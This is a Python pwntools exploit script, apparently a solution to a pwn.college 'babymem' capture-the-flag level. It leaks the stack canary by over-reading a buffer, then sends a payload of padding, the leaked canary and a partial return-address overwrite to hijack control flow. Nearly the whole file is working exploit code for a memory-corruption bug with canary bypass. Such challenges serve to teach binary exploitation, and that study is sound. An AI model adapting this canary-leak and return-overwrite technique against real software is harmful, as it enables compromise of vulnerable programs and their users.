
from pwn import *
p = process("/challenge/babymem-level-14-0")
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'120')
print(p.recvuntil(b"bytes)!"))
win = b"REPEAT"
p.send(win)
print(p.recvuntil(b"size:"))
p.sendline(b'121')
win = b"REPEAT"
win += b'\n'*115
p.send(win)
print(p.recvuntil(b"said"))
for j in range(115):
    print(j, p.recvline())
canary = p.recvline()
print("Canary : ",canary)
out = p.recvuntil(b"size:")
print(out.decode('utf-8', errors='ignore'))
p.send(b'600')
win = b"A"*505
win += b'\x00'+canary
win += b"A"*7
win += b'\x13\x1a'
p.send(win)
for j in range(200):
    print(p.recvline())




